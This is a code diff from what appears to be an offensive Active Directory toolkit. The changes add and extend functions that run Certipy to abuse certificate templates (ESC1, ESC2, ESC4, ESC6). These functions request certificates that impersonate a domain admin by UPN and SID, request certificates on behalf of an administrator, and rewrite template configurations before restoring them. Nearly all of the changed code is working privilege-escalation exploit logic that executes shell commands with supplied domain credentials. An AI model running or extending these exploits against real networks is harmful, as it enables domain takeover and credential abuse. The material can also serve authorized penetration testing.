@@ -6,6 +6,7 @@ import shutil
 from datetime import datetime
 from general_utils import log_command, current_date
 import re
+from modules import ad_bloodhound
 
 def describe_esc(esc):
     descriptions = {
@@ -16,7 +17,7 @@ def describe_esc(esc):
         "ESC5:": f"\033[91muser can modify certificate template access control lists (e.g., Role Based Constrained Delegation RBCD)\033[0m",
         "ESC6:": f"\033[91mVulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set (patched in May 2022 due to CVE-2022-26923)\033[0m",
         "ESC7:": f"\033[91mVulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 can be modified (need administrator CA rights or ManageCA rights over CA)\033[0m",
-        "ESC8:": f"\033[91mVulnerable web enrollment endpoint anbd at least one certificate template enabled that allows domain computer enrollment and client authentication\033[0m",
+        "ESC8:": f"\033[91mVulnerable web enrollment endpoint and at least one certificate template enabled that allows domain computer enrollment and client authentication\033[0m",
         "ESC9:": f"\033[91mDangerous permissions allow tampering with template ACLs.\033[0m",
         "ESC10:": f"\033[91mAbuses StrongCertificateBindingEnforcement or CertificateMappingMethods registry keys and spoofs UPN\033[0m",
         "ESC11:": f"\033[91mAbuses IF_ENFORCEENCRYPTICERTREQUEST between client and CA\033[0m"
@@ -127,7 +128,7 @@ def handle_ESC5(args, selected_template, selected_admin, target):
     certipy_ESC5(args, selected_template, selected_admin, target)
 
 def handle_ESC6(args, selected_template, selected_admin, target):
-    certipy_ESC6(args, selected_template, target)
+    certipy_ESC6(args, selected_template, selected_admin, target)
 
 def handle_ESC7(args, selected_template, selected_admin, target):
     certipy_ESC7(args, selected_template, target)
@@ -138,32 +139,33 @@ def handle_ESC8(args, selected_template, selected_admin, target):
 
 # === ESC Exploits ===
 def certipy_ESC1(args, selected_template, selected_admin, target):
-    if not selected_template or not selected_admin:
-        print("\033[91m[-] Missing template or domain admin. Skipping cert request.\033[0m")
-        return
-
     template_name = selected_template[1]
     ca_name = selected_template[2]
     admin_account, sid = selected_admin.split(":")
     upn = admin_account.strip()
     cmdsid = sid.strip()
     
+    #request admin cert
     command = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {upn} -template {template_name} -ca {ca_name} -target {target} -sid {cmdsid}"
-    print(f"\n[*] Requesting certificate using Certipy template '{template_name}' for user '{admin_account.strip()}'...\n")
-    print(f"[*] Running: {command}")
+    print(f"\n\033[96m[*] Requesting certificate using Certipy template '{template_name}' for user '{admin_account.strip()}'...\n\033[0m\033[0m")
+    print(f"\033[96m[*] Running: {command}\033[0m")
     subprocess.run(command, shell=True)
 
 def certipy_ESC2(args, selected_template, selected_admin, target):
     template_name = selected_template[1]
     ca_name = selected_template[2]
     admin_account, sid = selected_admin.split(":")
-
-    esc2_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template {template_name} -ca {ca_name} -sid {sid.strip()}"
+    admin_account2, garbage = admin_account.split("@")
+    userSID = ad_bloodhound.get_user_sid("ActiveDirectory/Bloodhound",args.domain_user)
+    
+    #Request user cert
+    esc2_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template {template_name} -ca {ca_name} -sid {userSID}"
     print(f"\033[96mESC2 attack with: {esc2_cmd}\033[0m")
     subprocess.call(esc2_cmd, shell=True)
-
-    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template user -ca {ca_name} -pfx {args.domain_user}.pfx -on-behalf-of {args.domain}\\{admin_account.strip()} -sid {sid.strip()}"
-    print(f"\033[96mRunning {esc2_pfx_cmd}\033[0m")
+    
+    #Request on behalf of admin 
+    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template User -ca {ca_name} -on-behalf-of '{args.domain}\\{admin_account2}' -pfx {args.domain_user}.pfx -sid {sid}"
+    print(f"\033[96m[*] Running {esc2_pfx_cmd}\033[0m")
     subprocess.call(esc2_pfx_cmd, shell=True)
 
 def certipy_ESC4(args, selected_template, selected_admin, target):
@@ -171,34 +173,35 @@ def certipy_ESC4(args, selected_template, selected_admin, target):
     ca_name = selected_template[2]
 
     # Overwrite template config
-    esc4_write = [
-        "certipy.pyz", "template",
-        "-u", f"{args.domain_user}@{args.domain}",
-        "-p", args.domain_pass,
-        "-template", template_name,
-        "-target", target,
-        "-save-configuration", "ESC4Save",
-        "-write-default-configuration",
-        "-force"
-    ]
-    print(f"\033[96mRunning {esc4_write}\033[0m")
-    subprocess.call(esc4_write)
+    esc4_write = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -template {template_name} -save-configuration ESC4Save -write-default-configuration" 
+    print(f"\033[96m[*] Running {esc4_write}\033[0m")
+    subprocess.run(esc4_write, shell=True)
 
     # Run ESC1 against modified template
     certipy_ESC1(args, selected_template, selected_admin, target)
 
     # Revert config
-    esc4_revert = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -template {template_name} -write-configuration ESC4Save.json"
-    print(f"\033[96mRunning {esc4_revert}\033[0m")
+    esc4_revert = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -template {template_name} -write-configuration ESC4Save.json"
+    print(f"\033[96m[*]Running {esc4_revert}\033[0m")
     subprocess.run(esc4_revert, shell=True)
 
 def certipy_ESC5(args, selected_template, selected_admin, target):
     print("[!] ESC5 exploitation not implemented.")
 
-def certipy_ESC6(args, selected_template):
-    print("[!] ESC6 exploitation not implemented.", target)
+def certipy_ESC6(args, selected_template, selected_admin, target):
+    template_name = "user"
+    ca_name = selected_template[2]
+    admin_account, sid = selected_admin.split(":")
+    upn = admin_account.strip()
+    cmdsid = sid.strip()
+    
+    #request admin cert (this is different from esc1 because ANY certificate could be used)
+    command = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {upn} -template {template_name} -ca {ca_name} -target {target} -sid {cmdsid}"
+    print(f"\n\033[96m[*] Requesting certificate using Certipy template '{template_name}' for user '{upn}'...\n\033[0m\033[0m")
+    print(f"\033[96m[*] Running: {command}\033[0m")
+    subprocess.run(command, shell=True)
 
-def certipy_ESC7(args, selected_template):
+def certipy_ESC7(args, selected_template, selected_admin, target):
     print("[!] ESC7 exploitation not implemented.", target)
 
 def certipy_ESC8(args, selected_template, selected_admin, target):
